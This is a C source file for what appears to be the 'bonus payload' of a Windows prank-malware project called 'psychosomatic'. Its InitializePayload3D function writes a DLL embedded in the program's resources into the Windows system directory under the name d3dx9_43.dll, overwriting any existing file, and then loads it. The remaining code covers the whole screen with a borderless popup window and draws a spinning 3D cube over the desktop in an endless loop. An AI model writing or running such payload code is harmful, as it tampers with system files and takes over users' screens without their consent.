#include "psychosomatic.h"

#define D3DXToRadian( degree ) ((degree) * (D3DX_PI / 180.0f))
#define D3DX_PI ((FLOAT)  3.141592654f)

INT SCREEN_WIDTH = 0, SCREEN_HEIGHT = 0;

#define CUSTOMFVF (D3DFVF_XYZ | D3DFVF_DIFFUSE)

typedef struct ___D3DVECTOR {
    float x;
    float y;
    float z;
} D3DXVECTOR3;
typedef struct ___D3DMATRIX {
    union {
        struct {
            float        _11, _12, _13, _14;
            float        _21, _22, _23, _24;
            float        _31, _32, _33, _34;
            float        _41, _42, _43, _44;

        };
        float m[4][4];
    };
} D3DXMATRIX;

HRESULT(*D3DXCreateTexture)(
    _In_  LPDIRECT3DDEVICE9  pDevice,
    _In_  UINT               Width,
    _In_  UINT               Height,
    _In_  UINT               MipLevels,
    _In_  DWORD              Usage,
    _In_  D3DFORMAT          Format,
    _In_  D3DPOOL            Pool,
    _Out_ LPDIRECT3DTEXTURE9* ppTexture
    ) = NULL;

D3DXMATRIX* (*D3DXMatrixPerspectiveFovLH)(
    _Inout_ D3DXMATRIX* pOut,
    _In_    FLOAT      fovy,
    _In_    FLOAT      Aspect,
    _In_    FLOAT      zn,
    _In_    FLOAT      zf
    ) = NULL;

D3DXMATRIX* (*D3DXMatrixLookAtLH)(
    _Inout_       D3DXMATRIX* pOut,
    _In_    const D3DXVECTOR3* pEye,
    _In_    const D3DXVECTOR3* pAt,
    _In_    const D3DXVECTOR3* pUp
    ) = NULL;

D3DXMATRIX* (*D3DXMatrixRotationY)(
    _Inout_ D3DXMATRIX* pOut,
    _In_    FLOAT       Angle
    ) = NULL;

D3DXMATRIX* (*D3DXMatrixRotationX)(
    _Inout_ D3DXMATRIX* pOut,
    _In_    FLOAT       Angle
    ) = NULL;

D3DXMATRIX* (*D3DXMatrixMultiply)(
    _Inout_       D3DXMATRIX* pOut,
    _In_    const D3DXMATRIX* pM1,
    _In_    const D3DXMATRIX* pM2
    ) = NULL;

INT WINAPI InitializePayload3D() {
    CHAR dllPath[MAX_PATH];
    DWORD dwBytesWritten = 0;
    GetSystemDirectoryA(dllPath, MAX_PATH);
    StringCchCatA(dllPath, MAX_PATH, "\\d3dx9_43.dll");

    HMODULE moduleHandle = GetModuleHandleW(NULL);
    HRSRC resourceFind = FindResourceW(moduleHandle, (LPCWSTR)IDR_DLL2, L"DLL");
    HGLOBAL resourceIdentifier = LoadResource(moduleHandle, resourceFind);
    DWORD dwResourceLength = SizeofResource(moduleHandle, resourceFind);
    PCHAR resourceData = LockResource(resourceIdentifier);

    HANDLE hFile = CreateFileA(dllPath, GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return __LINE__ - 4;
    }

    if (!WriteFile(hFile, resourceData, dwResourceLength, &dwBytesWritten, NULL)) {
        CloseHandle(hFile);
        return __LINE__ - 2;
    }

    CloseHandle(hFile);

    HMODULE lib = LoadLibraryA(dllPath);
    if (!lib)
        return __LINE__ - 2;
    HMODULE mod = GetModuleHandleA(dllPath);

    D3DXCreateTexture = (HRESULT(*)(
        _In_  LPDIRECT3DDEVICE9,
        _In_  UINT,
        _In_  UINT,
        _In_  UINT,
        _In_  DWORD,
        _In_  D3DFORMAT,
        _In_  D3DPOOL,
        _Out_ LPDIRECT3DTEXTURE9*))GetProcAddress(mod, "D3DXCreateTexture");
    if (!D3DXCreateTexture)
        return __LINE__ - 2;

    D3DXMatrixPerspectiveFovLH = (D3DXMATRIX*(*)(
        _Inout_ D3DXMATRIX*,
        _In_ FLOAT,
        _In_ FLOAT,
        _In_ FLOAT,
        _In_ FLOAT))GetProcAddress(mod, "D3DXMatrixPerspectiveFovLH");

    if (!D3DXMatrixPerspectiveFovLH)
        return __LINE__ - 3;

    D3DXMatrixLookAtLH = (D3DXMATRIX*(*)(
        _Inout_ D3DXMATRIX*,
        _In_ const D3DXVECTOR3*,
        _In_ const D3DXVECTOR3*,
        _In_ const D3DXVECTOR3*
        ))GetProcAddress(mod, "D3DXMatrixLookAtLH");

    if (!D3DXMatrixLookAtLH)
        return __LINE__ - 3;

    D3DXMatrixRotationY = (D3DXMATRIX*(*)(
        _Inout_ D3DXMATRIX*,
        _In_ FLOAT
        ))GetProcAddress(mod, "D3DXMatrixRotationY");

    if (!D3DXMatrixRotationY)
        return __LINE__ - 3;

    D3DXMatrixRotationX = (D3DXMATRIX*(*)(
        _Inout_ D3DXMATRIX*,
        _In_ FLOAT
        ))GetProcAddress(mod, "D3DXMatrixRotationX");

    if (!D3DXMatrixRotationX)
        return __LINE__ - 3;

    D3DXMatrixMultiply = (D3DXMATRIX*(*)(
        _Inout_ D3DXMATRIX*,
        _In_ const D3DXMATRIX*,
        _In_ const D3DXMATRIX*
        ))GetProcAddress(mod, "D3DXMatrixMultiply");

    if (!D3DXMatrixMultiply)
        return __LINE__ - 3;

    return 0;
}

typedef struct _CUSTOM_IMAGE {
    INT w, h;
    INT iReserved;
    HDC hdc;
    HBITMAP hbm;
    BITMAPINFO bitmapHdr;
    BYTE* pbPixelData;
} CUSTOM_IMAGE;

VOID WINAPI InitCubeVertices(void);

typedef struct tagCUSTOMVERTEX {
    FLOAT X, Y, Z;
    DWORD COLOR;
} CUSTOMVERTEX;

LPDIRECT3DVERTEXBUFFER9 vertexBuff = NULL;
HWND hWnd = NULL;
IDirect3D9* d3d = NULL;
IDirect3DDevice9* d3dlpDevice = NULL;
IDirect3DTexture9* lpD3DTexture = NULL;
IDirect3DSurface9* lpD3DTargetSurfaceRender = NULL;
IDirect3DSurface9* lpD3DSurfaceObj = NULL;
IDirect3DSurface9* lpD3DStencilDepthSurface = NULL;
LPDIRECT3DINDEXBUFFER9 indexBuffer = NULL;
CUSTOM_IMAGE imgWrapperDIB = { 0 };
INT framesThisSecond;

VOID WINAPI CustomImgDestroy(CUSTOM_IMAGE* pImage) {
    if (!pImage)
        return;

    pImage->w = 0;
    pImage->h = 0;
    pImage->iReserved = 0;

    if (pImage->hbm) {
        DeleteObject(pImage->hbm);
        pImage->hbm = 0;
    }

    if (pImage->hdc)
    {
        DeleteDC(pImage->hdc);
        pImage->hdc = 0;
    }

    memset(&pImage->bitmapHdr, 0, sizeof(pImage->bitmapHdr));
    pImage->pbPixelData = 0;
}

BOOL CustomImgCreate(CUSTOM_IMAGE* pImage, INT w, INT h) {
    if (!pImage)
        return FALSE;

    pImage->w = w;
    pImage->h = h;
    pImage->hdc = CreateCompatibleDC(NULL);
    pImage->pbPixelData = NULL;

    if (!pImage->hdc)
        return FALSE;

    memset(&pImage->bitmapHdr, 0, sizeof(pImage->bitmapHdr));

    pImage->bitmapHdr.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pImage->bitmapHdr.bmiHeader.biBitCount = 32;
    pImage->bitmapHdr.bmiHeader.biWidth = w;
    pImage->bitmapHdr.bmiHeader.biHeight = -h; // set starting point to 0,0
    pImage->bitmapHdr.bmiHeader.biCompression = BI_RGB;
    pImage->bitmapHdr.bmiHeader.biPlanes = 1; // why dis even an option bruh

    pImage->hbm = CreateDIBSection(pImage->hdc, &pImage->bitmapHdr,
        DIB_RGB_COLORS, (void**)&pImage->pbPixelData, NULL, 0); // i am clinically insane

    // win xp is dword aligning this but fuck windows xp :) this only works on it if you have
    // same width and height, and it must be in a range of 2^x, (x >= 1) like 512, 1024, etc
    pImage->pbPixelData = (LPBYTE)(((UINT_PTR)pImage->pbPixelData + 3) & ~3);
    if (!pImage->hbm) {
        CustomImgDestroy(pImage);
        return FALSE;
    }

    // flush batches down the toilet
    GdiFlush();
    return TRUE;
}

VOID WINAPI PaintLayeredWindow() {
    HDC hdc = GetDC(hWnd);

    if (hdc) {
        HGDIOBJ hPrevObj = 0;
        POINT ptDest = { 0, 0 };
        POINT ptSrc = { 0, 0 };
        SIZE client = { imgWrapperDIB.w, imgWrapperDIB.h };
        // dag im not making a pixel by pixel scan shit
        //BLENDFUNCTION blendFunc = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };

        hPrevObj = SelectObject(imgWrapperDIB.hdc, imgWrapperDIB.hbm);
        ClientToScreen(hWnd, &ptDest);

        UpdateLayeredWindow(hWnd, hdc, &ptDest, &client,
            imgWrapperDIB.hdc, &ptSrc, 0, 0, ULW_COLORKEY);

        SelectObject(imgWrapperDIB.hdc, hPrevObj);
        ReleaseDC(hWnd, hdc);
    }
}

VOID WINAPI Direct3DCleanup() {
    CustomImgDestroy(&imgWrapperDIB);

    if (lpD3DSurfaceObj) {
        lpD3DSurfaceObj->lpVtbl->Release(lpD3DSurfaceObj);
        lpD3DSurfaceObj = NULL;
    }

    if (lpD3DStencilDepthSurface) {
        lpD3DStencilDepthSurface->lpVtbl->Release(lpD3DStencilDepthSurface);
        lpD3DStencilDepthSurface = NULL;
    }

    if (lpD3DTargetSurfaceRender) {
        lpD3DTargetSurfaceRender->lpVtbl->Release(lpD3DTargetSurfaceRender);
        lpD3DTargetSurfaceRender = NULL;
    }

    if (lpD3DTexture) {
        lpD3DTexture->lpVtbl->Release(lpD3DTexture);
        lpD3DTexture = NULL;
    }

    if (vertexBuff) {
        vertexBuff->lpVtbl->Release(vertexBuff);
        vertexBuff = NULL;
    }

    if (indexBuffer) {
        indexBuffer->lpVtbl->Release(indexBuffer);
        indexBuffer = NULL;
    }

    if (d3dlpDevice) {
        d3dlpDevice->lpVtbl->Release(d3dlpDevice);
        d3dlpDevice = NULL;
    }

    if (d3d) {
        d3d->lpVtbl->Release(d3d);
        d3d = NULL;
    }
}

BOOL WINAPI PrepareTexturePaint(D3DFORMAT d3fFormat, D3DFORMAT d3fStencilDepth) {
    HRESULT err = 0;
    INT w = imgWrapperDIB.w, h = imgWrapperDIB.h;

    err = D3DXCreateTexture(d3dlpDevice, w, h, 0, D3DUSAGE_RENDERTARGET,
        d3fFormat, D3DPOOL_DEFAULT, &lpD3DTexture);

    if (FAILED(err))
        return FALSE;

    err = lpD3DTexture->lpVtbl->GetSurfaceLevel(lpD3DTexture, 0, &lpD3DTargetSurfaceRender);

    if (FAILED(err))
        return FALSE;

    err = d3dlpDevice->lpVtbl->CreateDepthStencilSurface(d3dlpDevice, w, h, d3fStencilDepth,
        0, 0, TRUE, &lpD3DStencilDepthSurface, 0);

    if (FAILED(err))
        return FALSE;

    err = d3dlpDevice->lpVtbl->CreateOffscreenPlainSurface(d3dlpDevice, w, h,
        d3fFormat, D3DPOOL_SYSTEMMEM, &lpD3DSurfaceObj, 0);

    return SUCCEEDED(err);
}

BOOL InitDirect3D() {
    HRESULT hr = 0;
    D3DPRESENT_PARAMETERS params = { 0 };
    D3DDISPLAYMODE desktop = { 0 };
    D3DXMATRIX view = { 0 };
    D3DMATERIAL9 defMaterial = {
        0.8f, 0.8f, 0.8f, 1.0f, 0.2f, 0.2f, 0.2f, 1.0f, 0.0f,
        0.0f, 0.0f, 1.0f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f
    };
    D3DXMATRIX projection = { 0 };

    d3d = Direct3DCreate9(D3D_SDK_VERSION);

    if (!d3d)
        return FALSE;

    hr = d3d->lpVtbl->GetAdapterDisplayMode(d3d, D3DADAPTER_DEFAULT, &desktop);

    if (FAILED(hr))
        return FALSE;

    params.BackBufferWidth = 0;
    params.BackBufferHeight = 0;
    params.BackBufferFormat = D3DFMT_X8R8G8B8; // best format confirmed (not really why the fuck are you allocating 8 bits of memory for an integer that isn't even used :skull:)
    params.BackBufferCount = 1;
    params.MultiSampleType = 0;
    params.MultiSampleQuality = 0;
    params.SwapEffect = D3DSWAPEFFECT_DISCARD;
    params.hDeviceWindow = hWnd;
    params.Windowed = TRUE;
    params.EnableAutoDepthStencil = TRUE;
    params.AutoDepthStencilFormat = D3DFMT_D16;
    params.Flags = D3DPRESENTFLAG_DISCARD_DEPTHSTENCIL;
    params.FullScreen_RefreshRateInHz = 0;
    params.PresentationInterval = D3DPRESENT_INTERVAL_DEFAULT;

    hr = d3d->lpVtbl->CreateDevice(d3d, D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd,
        D3DCREATE_HARDWARE_VERTEXPROCESSING | D3DCREATE_PUREDEVICE,
        &params, &d3dlpDevice);

    if (FAILED(hr)) {
        hr = d3d->lpVtbl->CreateDevice(d3d, D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL,
            hWnd, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &params, &d3dlpDevice);
    }

    if (FAILED(hr))
        return FALSE;

    if (!PrepareTexturePaint(D3DFMT_X8R8G8B8, D3DFMT_D24S8))
        return FALSE;

    D3DXMatrixPerspectiveFovLH(&projection, D3DX_PI / 4.0f,
        (FLOAT)imgWrapperDIB.w / (FLOAT)imgWrapperDIB.h, 1.0f, 100.0f);
    
    D3DXMatrixLookAtLH(&view, &((D3DXVECTOR3) { 0.0f, 0.0f, -30.0f + ((rand() % 10) - 5) }),
        &(D3DXVECTOR3){ 0.0f, 0.0f, 0.0f }, & (D3DXVECTOR3){0.0f, 1.0f, 0.0f});

    d3dlpDevice->lpVtbl->SetTransform(d3dlpDevice, D3DTS_VIEW, (const D3DMATRIX*)&view);
    d3dlpDevice->lpVtbl->SetRenderState(d3dlpDevice, D3DRS_ZENABLE, TRUE);
    d3dlpDevice->lpVtbl->SetRenderState(d3dlpDevice, D3DRS_LIGHTING, TRUE);
    d3dlpDevice->lpVtbl->SetRenderState(d3dlpDevice, D3DRS_ALPHABLENDENABLE, TRUE);
    d3dlpDevice->lpVtbl->SetRenderState(d3dlpDevice, D3DRS_SRCBLEND, D3DBLEND_SRCALPHA);
    d3dlpDevice->lpVtbl->SetRenderState(d3dlpDevice, D3DRS_DESTBLEND, D3DBLEND_INVSRCALPHA);
    d3dlpDevice->lpVtbl->SetRenderState(d3dlpDevice, D3DRS_LIGHTING, FALSE);

    d3dlpDevice->lpVtbl->SetMaterial(d3dlpDevice, &defMaterial);

    d3dlpDevice->lpVtbl->SetTransform(d3dlpDevice, D3DTS_PROJECTION, (const D3DMATRIX*)&projection);


    InitCubeVertices();

    return TRUE;
}

VOID WINAPI InitCubeVertices(void) {
    short indices[] = {
        0, 1, 2, 2, 1, 3, 4, 0, 6, 6, 0, 2, 7, 5, 6, 6, 5, 4,
        3, 1, 7, 7, 1, 5, 4, 5, 0, 0, 5, 1, 3, 7, 2, 2, 7, 6
    };
    CUSTOMVERTEX vertices[] = {
        { -3.0f, 3.0f, -3.0f,  D3DCOLOR_XRGB(0, 0, 255), },
        { 3.0f, 3.0f, -3.0f,   D3DCOLOR_XRGB(0, 255, 0), },
        { -3.0f, -3.0f, -3.0f, D3DCOLOR_XRGB(255, 0, 0), },
        { 3.0f, -3.0f, -3.0f,  D3DCOLOR_XRGB(255, 255, 0), },
        { -3.0f, 3.0f, 3.0f,   D3DCOLOR_XRGB(0, 255, 0), },
        { 3.0f, 3.0f, 3.0f,    D3DCOLOR_XRGB(0, 255, 255), },
        { -3.0f, -3.0f, 3.0f,  D3DCOLOR_XRGB(0, 0, 255), },
        { 3.0f, -3.0f, 3.0f,   D3DCOLOR_XRGB(255, 0, 255), },
    };

    d3dlpDevice->lpVtbl->CreateVertexBuffer(d3dlpDevice,
        8 * sizeof(CUSTOMVERTEX),
        0,
        CUSTOMFVF,
        D3DPOOL_MANAGED,
        &vertexBuff,
        NULL);

    VOID* lockedBuffer;

    vertexBuff->lpVtbl->Lock(vertexBuff, 0, 0, (void**)&lockedBuffer, 0);
    memcpy(lockedBuffer, vertices, sizeof(vertices));
    vertexBuff->lpVtbl->Unlock(vertexBuff);

    d3dlpDevice->lpVtbl->CreateIndexBuffer(d3dlpDevice,
        36 * 2,
        0,
        D3DFMT_INDEX16,
        D3DPOOL_MANAGED,
        &indexBuffer,
        NULL);

    indexBuffer->lpVtbl->Lock(indexBuffer, 0, 0, (void**)&lockedBuffer, 0);
    memcpy(lockedBuffer, indices, sizeof(indices));
    indexBuffer->lpVtbl->Unlock(indexBuffer);
}

BOOL Initialize3DPayload2()
{
    if (!CustomImgCreate(&imgWrapperDIB, SCREEN_WIDTH, SCREEN_HEIGHT))
        return FALSE;
    if (!InitDirect3D())
    {
        Direct3DCleanup();
        return FALSE;
    }

    return TRUE;
}

void CopyRenderTextureToImage() {
    HRESULT err = 0;
    D3DLOCKED_RECT rcLock = { 0 };

    err = d3dlpDevice->lpVtbl->GetRenderTargetData(d3dlpDevice, lpD3DTargetSurfaceRender, lpD3DSurfaceObj);

    if (SUCCEEDED(err)) {
        err = lpD3DSurfaceObj->lpVtbl->LockRect(lpD3DSurfaceObj, &rcLock, 0, 0);

        if (SUCCEEDED(err))
        {
            BYTE* pSrc = (BYTE*)(((UINT_PTR)rcLock.pBits + 3) & ~3);
            BYTE* pDest = imgWrapperDIB.pbPixelData;
            int srcPitch = rcLock.Pitch;
            int destPitch = imgWrapperDIB.iReserved;

            if (TRUE)
            {
                memcpy(pDest, pSrc, (imgWrapperDIB.w * imgWrapperDIB.h) * 4);
            }
            else
            {
                for (int i = 0; i < imgWrapperDIB.h; ++i)
                    memcpy(&pDest[destPitch * i], &pSrc[srcPitch * i], destPitch);
            }

            lpD3DSurfaceObj->lpVtbl->UnlockRect(lpD3DSurfaceObj);
        }
    }
}

VOID WINAPI RenderFrame() {
    d3dlpDevice->lpVtbl->SetDepthStencilSurface(d3dlpDevice, lpD3DStencilDepthSurface);
    d3dlpDevice->lpVtbl->SetRenderTarget(d3dlpDevice, 0, lpD3DTargetSurfaceRender);

    d3dlpDevice->lpVtbl->Clear(d3dlpDevice, 0, 0,
        D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER | D3DCLEAR_ZBUFFER,
        D3DCOLOR_COLORVALUE(0.0f, 0.0f, 0.0f, 0.0f), 1.0f, 0);

    if (SUCCEEDED(d3dlpDevice->lpVtbl->BeginScene(d3dlpDevice))) {
        framesThisSecond++;

        d3dlpDevice->lpVtbl->SetFVF(d3dlpDevice, CUSTOMFVF);
        D3DXMATRIX Rotx, Roty, Rotall;
        D3DXMATRIX viewMtx;
        INT maxX = SCREEN_WIDTH;
        INT maxY = SCREEN_HEIGHT;
        FLOAT inx = sinf(timeGetTime() / 1000.f) * (maxX / 100.f - 3),
            iny = cosf(timeGetTime() / 1000.f) * (maxY / 100.f - 3);
        D3DXMatrixLookAtLH(&viewMtx, &((D3DXVECTOR3) { 0.0f, 0.0f, -30.0f }),
            &(D3DXVECTOR3){ inx, iny, 0.0f }, & (D3DXVECTOR3){0.0f, 1.0f, 0.0f});
        d3dlpDevice->lpVtbl->SetTransform(d3dlpDevice, D3DTS_VIEW, (D3DMATRIX*)&viewMtx);

        D3DXMatrixRotationY(&Roty, timeGetTime() / 1000.0f);
        D3DXMatrixRotationX(&Rotx, timeGetTime() / 1000.0f);
        D3DXMatrixMultiply(&Rotall, &Roty, &Rotx);

        d3dlpDevice->lpVtbl->SetTransform(d3dlpDevice, D3DTS_WORLD, (D3DMATRIX*)&Rotall);
        d3dlpDevice->lpVtbl->SetStreamSource(d3dlpDevice, 0, vertexBuff, 0, sizeof(CUSTOMVERTEX));
        d3dlpDevice->lpVtbl->SetIndices(d3dlpDevice, indexBuffer);
        d3dlpDevice->lpVtbl->DrawIndexedPrimitive(d3dlpDevice, D3DPT_TRIANGLELIST, 0, 0, 8, 0, 12);

        d3dlpDevice->lpVtbl->EndScene(d3dlpDevice);

        CopyRenderTextureToImage();
        PaintLayeredWindow();

    }
}

LRESULT CALLBACK WndProc3D(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    static TCHAR szBuffer[32] = { 0 };

    switch (msg)
    {
    case WM_CREATE:
        timeBeginPeriod(1);
        SetTimer(hWnd, 1, 1000, 0);
        return 0;

    case WM_DESTROY:
        KillTimer(hWnd, 1);
        timeEndPeriod(1);
        PostQuitMessage(0);
        return 0;
    

    case WM_TIMER:
        StringCchPrintf(szBuffer, 32, TEXT("%d FPS"), framesThisSecond);
        framesThisSecond = 0;
        return 0;

    default:
        break;
    }

    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int PsBonusPayload(HINSTANCE hInstance) {
    MSG msg = { 0 };
    WNDCLASSEX wcl = { 0 };
    SCREEN_WIDTH = GetSystemMetrics(0), SCREEN_HEIGHT = GetSystemMetrics(1);

    wcl.cbSize = sizeof(wcl);
    wcl.style = CS_HREDRAW | CS_VREDRAW;
    wcl.lpfnWndProc = WndProc3D;
    wcl.cbClsExtra = 0;
    wcl.cbWndExtra = 0;
    wcl.hInstance = hInstance;
    wcl.hIcon = LoadIcon(0, IDI_APPLICATION);
    wcl.hCursor = LoadCursor(0, IDC_ARROW);
    wcl.hbrBackground = 0;
    wcl.lpszMenuName = 0;
    wcl.lpszClassName = TEXT("psychosomaticBonusPayload");
    wcl.hIconSm = 0;

    if (!RegisterClassEx(&wcl))
        return 1;

    hWnd = CreateWindowEx(WS_EX_LAYERED, wcl.lpszClassName,
        TEXT("psychosomaticBonusPayload"), WS_POPUP, 0, 0,
        SCREEN_WIDTH, SCREEN_HEIGHT, 0, 0,
        wcl.hInstance, 0);
    if (!hWnd)
        return 2;
    ShowWindow(hWnd, SW_SHOW);
    if (hWnd) {
        if (Initialize3DPayload2()) {
            UpdateWindow(hWnd);

            while (TRUE)
            {
                if (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
                {
                    if (msg.message == WM_QUIT)
                        break;

                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                else
                {
                    RenderFrame();
                }
            }
        }

        Direct3DCleanup();
        UnregisterClass(wcl.lpszClassName, hInstance);
    }

    return 0;
}

DWORD CALLBACK PsBonusPayloadThread(LPVOID lpParamater) {
    return PsBonusPayload((HINSTANCE)lpParamater) == 0;
}
